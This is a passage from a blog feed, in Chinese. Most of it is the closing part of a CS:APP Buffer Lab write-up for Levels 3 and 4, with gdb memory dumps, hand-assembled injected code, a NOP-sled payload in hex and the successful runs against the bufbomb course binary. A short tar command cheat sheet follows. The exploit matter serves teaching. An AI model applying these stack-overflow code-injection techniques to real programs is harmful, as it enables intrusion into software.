-0x28(%ebp),%eax</div><div class="line">   0x08048c0d &lt;+9&gt;:	mov    %eax,(%esp)</div><div class="line">   0x08048c10 &lt;+12&gt;:	call   0x8048b4a &lt;Gets&gt;</div><div class="line">   0x08048c15 &lt;+17&gt;:	mov    $0x1,%eax</div><div class="line">   0x08048c1a &lt;+22&gt;:	leave  </div><div class="line">   0x08048c1b &lt;+23&gt;:	ret    </div><div class="line">End of assembler dump.</div><div class="line">(gdb) x /10xw $ebp</div><div class="line">0x55683450 &lt;_reserved+1037392&gt;:	0x55683480	0x08048c93	0x55686018	0x00000b60</div><div class="line">0x55683460 &lt;_reserved+1037408&gt;:	0x55685ff0	0xb7e7143f	0xb7fd1ac0	0x08049f4b</div><div class="line">0x55683470 &lt;_reserved+1037424&gt;:	0x5568348c	0x7902ca39</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p>做法就是在执行getbuf函数的时候，通过查看<code>%ebp</code>后面的内存的值，能得到旧的<code>%ebp</code>的值为<code>0x55683480</code>,正确的返回地址的值<code>0x08048c93</code>，和我们设计的攻击代码里的是一一对应的。</p>
<p>然后和阶段二一样汇编攻击代码和反汇编得到指令序列：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">level3-exlpoit.o:     file format elf32-i386</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">00000000 &lt;.text&gt;:</div><div class="line">   0:	a1 e4 c1 04 08       	mov    0x804c1e4,%eax</div><div class="line">   5:	bd 80 34 68 55       	mov    $0x55683480,%ebp</div><div class="line">   a:	ff 35 93 8c 04 08    	pushl  0x8048c93</div><div class="line">  10:	c3                   	ret</div></pre></td></tr></table></figure>
<p>所以我们构建的攻击代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">a1 e4 c1 04 08 bd 80 34</div><div class="line">68 55 68 93 8c 04 08 c3</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 </div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 28 34 68 55</div></pre></td></tr></table></figure></p>
<p>如果你看过我们阶段2的做法，会发现这里跟阶段二不一样了，我们现在把攻击代码放在了<code>buf</code>的开始位置了，因为这样能更方便的维护`%esp·。</p>
<p>执行完<code>getbuf</code>后的内存结构:</p>
<p><img src="/images/CSAPP-BufferLab-06.png" alt="level-3"></p>
<p>注意到此时的<code>%esp</code>是在正确的位置的，也就是说现在的<code>%esp</code>就是函数test在调用getbuf前的值。</p>
<p>当执行完<code>push 0x8048c93</code>，把正确的返回地址入栈，此时<code>%esp</code>减 4 ，不回稍后执行 <code>ret</code>把正确地址pop给pc时，<code>%esp</code>会加4，回到正确的位置，恢复test函数的栈帧。 </p>
<p>当执行完<code>push 0x8048c93</code>时的内存空间：</p>
<p><img src="/images/CSAPP-BufferLab-07.png" alt="level-3"></p>
<p>执行结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level3.txt | ./hex2raw | ./bufbomb -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:Boom!: getbuf returned 0x52f8c747</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<h4 id="Level-4-Nitroglycerin"><a href="#Level-4-Nitroglycerin" class="headerlink" title="Level 4 Nitroglycerin"></a>Level 4 Nitroglycerin</h4><p>For this level, we have gone the opposite direction, making the stack positions even less stable than they normally are. Hence the name “nitroglycerin”—an explosive that is notoriously unstable.</p>
<p>When you run BUFBOMB with the command line flag “-n,” it will run in “Nitro” mode. Rather than calling<br>the function getbuf, the program calls a slightly different function getbufn:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">int getbufn()</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">   char buf[512];</div><div class="line"></div><div class="line">   Gets(buf);</div><div class="line"></div><div class="line">   return 1;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个函数与getbuf所不同的是，分配了512字节的字符数组，而调用getbufn的函数会在栈中随机分配一段存储区，这导致getbufn使用的栈基址EBP随机变化。此外，在Nitro模式运行时，bufbomb会要求提供5次输入字符串，每一次都要求getbufn的返回值为实验者的cookie。</p>
<p>Level4的其他要求与Level3相同，但它要求提供同一个恶意代码，在getbufn被调用5次后，最终仍返回到testn函数中，且不能破坏testn的堆栈状态，并使返回值为cookie。</p>
<p>总结一下，编写恶意代码需要满足（1）恢复testn的栈帧；（2）设置 getbufn 返回值为cookie；（3）跳转到testn中调用getbufn后的下一指令地址。</p>
<p>首先，先说一下如何解决对于栈上地址不固定，二通过溢出输入字符串写入栈的跳转地址需要固定的问题。依据英文PDF，我们可以痛<code>nop sleds</code>的技术，大概就是：在不清楚有效机器代码的入口地址时，可以在有效机器代码前以大量的NOP机器指令填充，只要跳转地址处于这些nop 上就能到达有效机器代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">空操作指令指令格式：NOP</div><div class="line"></div><div class="line">   说明：NOP是英语“No Operation”的缩写。NOP无操作数，所以称为“空操作”。</div><div class="line"></div><div class="line">   执行NOP指令只使程序计数器PC加1，所以占用一个机器周期。</div></pre></td></tr></table></figure></p>
<p>同时，由于栈上的机器代码是按地址由低向高顺序执行，要保证五次运行都能顺利执行有效机器代码，需要满足：<strong>跳转地址位于有效机器代码入口地址之前的nop机器指令填充区。这要求尽可能增大nop填充区，尽可能使有效机器代码段往后挪。</strong></p>
<p>有了上面的基础，我们首先来看看getbufn的汇编代码与getbuf有什么区别！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">08048be6 &lt;getbufn&gt;:</div><div class="line"> 8048be6:	55                   	push   %ebp</div><div class="line"> 8048be7:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8048be9:	81 ec 18 02 00 00    	sub    $0x218,%esp</div><div class="line"> 8048bef:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax</div><div class="line"> 8048bf5:	89 04 24             	mov    %eax,(%esp)</div><div class="line"> 8048bf8:	e8 4d ff ff ff       	call   8048b4a &lt;Gets&gt;</div><div class="line"> 8048bfd:	b8 01 00 00 00       	mov    $0x1,%eax</div><div class="line"> 8048c02:	c9                   	leave  </div><div class="line"> 8048c03:	c3                   	ret    </div><div class="line"></div><div class="line">08048c04 &lt;getbuf&gt;:</div><div class="line"> 8048c04:	55                   	push   %ebp</div><div class="line"> 8048c05:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8048c07:	83 ec 38             	sub    $0x38,%esp</div><div class="line"> 8048c0a:	8d 45 d8             	lea    -0x28(%ebp),%eax</div><div class="line"> 8048c0d:	89 04 24             	mov    %eax,(%esp) &lt;-- $eax保存输入字符串存放的地址, 由栈来传递给Gets函数</div><div class="line"> 8048c10:	e8 35 ff ff ff       	call   8048b4a &lt;Gets&gt;</div><div class="line"> 8048c15:	b8 01 00 00 00       	mov    $0x1,%eax</div><div class="line"> 8048c1a:	c9                   	leave  </div><div class="line"> 8048c1b:	c3                   	ret</div></pre></td></tr></table></figure>
<p>发现在调用getbuf时，ebp的内容比esp内容大0x28，而在getbufn中大0x218。</p>
<p>通过查看testn的汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">08048c1c &lt;testn&gt;:</div><div class="line"> 8048c1c:	55                   	push   %ebp</div><div class="line"> 8048c1d:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8048c1f:	83 ec 28             	sub    $0x28,%esp</div><div class="line"> 8048c22:	c7 45 f4 ef be ad de 	movl   $0xdeadbeef,-0xc(%ebp)</div><div class="line"> 8048c29:	e8 b8 ff ff ff       	call   8048be6 &lt;getbufn&gt;</div><div class="line"> 8048c2e:	8b 55 f4             	mov    -0xc(%ebp),%edx</div><div class="line"> 8048c31:	81 fa ef be ad de    	cmp    $0xdeadbeef,%edx</div><div class="line"> 8048c37:	74 0e                	je     8048c47 &lt;testn+0x2b&gt;</div><div class="line"> 8048c39:	c7 04 24 a8 a0 04 08 	movl   $0x804a0a8,(%esp)</div><div class="line"> 8048c40:	e8 fb fc ff ff       	call   8048940 &lt;puts@plt&gt;</div><div class="line"> 8048c45:	eb 36                	jmp    8048c7d &lt;testn+0x61&gt;</div><div class="line"> 8048c47:	3b 05 e4 c1 04 08    	cmp    0x804c1e4,%eax</div><div class="line"> 8048c4d:	75 1e                	jne    8048c6d &lt;testn+0x51&gt;</div><div class="line"> 8048c4f:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8048c53:	c7 04 24 d4 a0 04 08 	movl   $0x804a0d4,(%esp)</div><div class="line"> 8048c5a:	e8 81 fc ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8048c5f:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)</div><div class="line"> 8048c66:	e8 79 04 00 00       	call   80490e4 &lt;validate&gt;</div><div class="line"> 8048c6b:	eb 10                	jmp    8048c7d &lt;testn+0x61&gt;</div><div class="line"> 8048c6d:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8048c71:	c7 04 24 f7 9e 04 08 	movl   $0x8049ef7,(%esp)</div><div class="line"> 8048c78:	e8 63 fc ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8048c7d:	c9                   	leave  </div><div class="line"> 8048c7e:	c3                   	ret</div></pre></td></tr></table></figure></p>
<p>可以知道在调用getbufn前，<code>$ebp = $esp+0x28</code>，同时也能得到正确返回地址为<code>0x8048c2e</code>,所以可构造攻击代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">leal 0x28(%esp), %ebp  /* recovery %ebp */</div><div class="line">mov 0x804c1e4, %eax   /* move cookie to %eax as return value */</div><div class="line">push $0x8048c2e       /* return address */</div><div class="line">ret</div></pre></td></tr></table></figure>
<p>指令序列为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">8d 6c 24 28</div><div class="line">a1 e4 c1 04 08</div><div class="line">68 2e 8c 04 08</div><div class="line">c3</div></pre></td></tr></table></figure></p>
<p>攻击代码设计好了，现在要做的就是找一个合适的地址，以确保在栈随机的情况下也能执行我们的攻击代码。现在我们就看看-n模式下getbufn的 <code>$ebp</code>是怎么变化的。</p>
<p>使用gdb调试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ gdb bufbomb</div><div class="line">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1</div><div class="line">Copyright (C) 2014 Free Software Foundation, Inc.</div><div class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class="line">This is free software: you are free to change and redistribute it.</div><div class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</div><div class="line">and &quot;show warranty&quot; for details.</div><div class="line">This GDB was configured as &quot;i686-linux-gnu&quot;.</div><div class="line">Type &quot;show configuration&quot; for configuration details.</div><div class="line">For bug reporting instructions, please see:</div><div class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</div><div class="line">Find the GDB manual and other documentation resources online at:</div><div class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</div><div class="line">For help, type &quot;help&quot;.</div><div class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</div><div class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</div><div class="line">(gdb) break getbufn</div><div class="line">Breakpoint 1 at 0x8048bef</div><div class="line">(gdb) run -n -u xzz</div><div class="line">Starting program: /home/ubuntu/mybuflab_solved/bufbomb -n -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048bef in getbufn ()</div><div class="line">(gdb) print $ebp</div><div class="line">$1 = (void *) 0x55683450 &lt;_reserved+1037392&gt;</div><div class="line">(gdb) x /4xw $ebp</div><div class="line">0x55683450 &lt;_reserved+1037392&gt;:	0x55683480	0x08048c2e	0x55686018	0x00000b60</div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line">Type string:1</div><div class="line">Dud: getbufn returned 0x1</div><div class="line">Better luck next time</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048bef in getbufn ()</div><div class="line">(gdb) print $ebp</div><div class="line">$2 = (void *) 0x55683430 &lt;_reserved+1037360&gt;</div><div class="line">(gdb) x /4xw $ebp</div><div class="line">0x55683430 &lt;_reserved+1037360&gt;:	0x55683460	0x08048c2e	0x55686018	0x00000b60</div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line">Type string:2</div><div class="line">Dud: getbufn returned 0x1</div><div class="line">Better luck next time</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048bef in getbufn ()</div><div class="line">(gdb) print $ebp</div><div class="line">$3 = (void *) 0x55683400 &lt;_reserved+1037312&gt;</div><div class="line">(gdb) x /4xw $ebp</div><div class="line">0x55683400 &lt;_reserved+1037312&gt;:	0x55683430	0x08048c2e	0x55686018	0x00000b60</div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line">Type string:3</div><div class="line">Dud: getbufn returned 0x1</div><div class="line">Better luck next time</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048bef in getbufn ()</div><div class="line">(gdb) print $ebp</div><div class="line">$4 = (void *) 0x556833e0 &lt;_reserved+1037280&gt;</div><div class="line">(gdb) x /4xw $ebp</div><div class="line">0x556833e0 &lt;_reserved+1037280&gt;:	0x55683410	0x08048c2e	0x55686018	0x00000b60</div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line">Type string:4</div><div class="line">Dud: getbufn returned 0x1</div><div class="line">Better luck next time</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048bef in getbufn ()</div><div class="line">(gdb) print $ebp</div><div class="line">$5 = (void *) 0x556833e0 &lt;_reserved+1037280&gt;</div><div class="line">(gdb) x /4xw $ebp</div><div class="line">0x556833e0 &lt;_reserved+1037280&gt;:	0x55683410	0x08048c2e	0x55686018	0x00000b60</div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line">Type string:5</div><div class="line">Dud: getbufn returned 0x1</div><div class="line">Better luck next time</div></pre></td></tr></table></figure>
<p>通过调试得到getbufn函数的%ebp值:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0x55683450</div><div class="line">0x55683430</div><div class="line">0x55683400</div><div class="line">0x556833e0</div><div class="line">0x556833e0</div></pre></td></tr></table></figure></p>
<p>所以我们得到字符串的存储位置为 <code>%ebp-0x208 (520)</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0x55683248</div><div class="line">0x55683228</div><div class="line">0x556831f8</div><div class="line">0x556831d8</div><div class="line">0x556831d8</div></pre></td></tr></table></figure></p>
<p>变化范围为:<code>0x70 (112)</code></p>
<p>同时也能得到testn函数的%ebp值:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0x55683480</div><div class="line">0x55683460</div><div class="line">0x55683430</div><div class="line">0x55683410</div><div class="line">0x55683410</div></pre></td></tr></table></figure></p>
<p>看出getbufn的<code>%ebp</code>值比testn的<code>%ebp</code> 小 0x30.</p>
<p>我们还有一件最后的事要做：寻找getbufn返回时跳转的合适地址，确保在栈随机的情况下的每次跳转都能执行我们的攻击代码。</p>
<p>根据调试得到的信息，我们得到一张图：</p>
<p><img src="/images/CSAPP-Bufferlab-08.png" alt="level-4"></p>
<p>我们可以</p>
<p>我们将最高的buf地址<code>0x55683248</code>作为跳转地址，将有效机器代码置于跳转地址之前，并将其它所有字符都用作nop指令，此时所有五个buf地址的写入都能满足跳转到地址<code>0x55683248</code>后顺利到达有效机器代码。</p>
<p>所以我们构造的攻击字符：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 8d</div><div class="line">6c 24 28 a1 e4 c1 04 08 68 2e </div><div class="line">8c 04 08 c3 48 32 68 55</div></pre></td></tr></table></figure></p>
<p>执行结果:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level4.txt | ./hex2raw -n | ./bufbomb -u xzz -n</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:KABOOM!: getbufn returned 0x52f8c747</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x52f8c747</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x52f8c747</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x52f8c747</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x52f8c747</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个实验还是挺有趣的。一步步下来，通过反汇编、gdb调试，然后研究反汇编代码发现漏洞，这个过程充满乐趣又有挑战性。实验中，充分理解IA-32的栈帧结构以及过程调用的机制。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用&lt;code&gt;缓冲区溢出漏洞&lt;/code&gt;生成
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>Linux|Linux命令小抄</title>
    <link href="http://yoursite.com/2018/05/11/Linux-Linux%E5%91%BD%E4%BB%A4%E5%B0%8F%E6%8A%84/"/>
    <id>http://yoursite.com/2018/05/11/Linux-Linux命令小抄/</id>
    <published>2018-05-10T23:16:31.000Z</published>
    <updated>2018-05-18T17:01:56.032Z</updated>
    
    <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>本文章记录自己学习Linux路上的点点滴滴。</p>
<h2 id="文本操作命令"><a href="#文本操作命令" class="headerlink" title="文本操作命令"></a>文本操作命令</h2><h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-c: 建立压缩档案</div><div class="line">-x：解压</div><div class="line">-t：查看内容</div><div class="line">-r：向压缩归档文件末尾追加文件</div><div class="line">-u：更新原压缩包中的文件</div></pre></td></tr></table></figure>
<p>这五个是独立的命令，压缩解压都要用到其中一个，可以和别的命令连用但只能用其中一个。下面的参数是根据需要在压缩或解压档案时可选的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-z：有gzip属性的</div><div class="line">-j：有bz2属性的</div><div class="line">-Z：有compress属性的</div><div class="line">-v：显示所有过程</div><div class="line">-O：将文件解开到标准输出</div></pre></td></tr></table></figure></p>
<p>下面的参数-f是必须的</p>
<p><code>-f</code>: 使用档案名字，切记，这个参数是最后一个参数，后面只能接档案名。</p>
<p><code>tar -cf all.tar *.jpg</code><br>这条命令是将所有.jpg的文件打成一个名为all.tar的包。-c是表示产生新的包，-f指定包的文件名。</p>
<p><code>tar -rf all.tar *.gif</code><br>这条命令是将所有.gif的文件增加到all.tar的包里面去。-r是表示增加文件的意思。</p>
<p><code>tar -uf all.tar logo.gif</code><br>这条命令是更新原来tar包all.tar中logo.gif文件，-u是表示更新文件的意思。</p>
<p><code>tar -tf all.tar</code><br>这条命令是列出all.tar包中所有文件，-t是列出文件的意思</p>
<p><code>tar -xf all.tar</code><br>这条命令是解出all.tar包中所有文件，-x是解开的意思</p>
<p>压缩的一些例子</p>
<pre><code>tar –cvf jpg.tar *.jpg  将目录里所有jpg文件打包成tar.jpg
tar –czf jpg.tar.gz *.jpg   将目录里所有jpg文件打包成jpg.tar后，并且将其用gzip压缩，生成一个gzip压缩过的包，命名为jpg.tar.gz
tar –cjf jpg.tar.bz2 *.jpg 将目录里所有jpg文件打包成jpg.tar后，并且将其用bzip2压缩，生成一个bzip2压缩过的包，命名为jpg.tar.bz2
tar –cZf jpg.tar.Z *.jpg   将目录里所有jpg文件打包成jpg.tar后，并且将其用compress压缩，生成一个umcompress压缩过的包，命名为jpg.tar.Z
rar a jpg.rar *.jpg rar格式的压缩，需要先下载rar for linux
zip jpg.zip *.jpg   zip格式的压缩，需要先下载zip for linux
</code></pre><p>解压的一些例子</p>
<pre><code>tar –xvf file.tar  解压 tar包
tar -xzvf file.tar.gz 解压tar.gz
tar -xjvf file.tar.bz2   解压 tar.bz2
tar –xZvf file.tar.Z   解压tar.Z
unrar e file.rar 解压rar
unzip file.zip 解压zip
</code></pre><p>总结</p>
<pre><code>*.tar 用 tar –xvf 解压
*.gz 用 gzip -d或者gunzip 解压
*.tar.gz和*.tgz 用 tar –xzf 解压
*.bz2 用 bzip2 -d或者用bunzip2 解压
*.tar.bz2用tar –xjf 解压
*.Z 用 uncompress 解压
*.tar.Z 用tar –xZf 解压
*.rar 用 unrar e解压
*.zip 用 unzip 解压
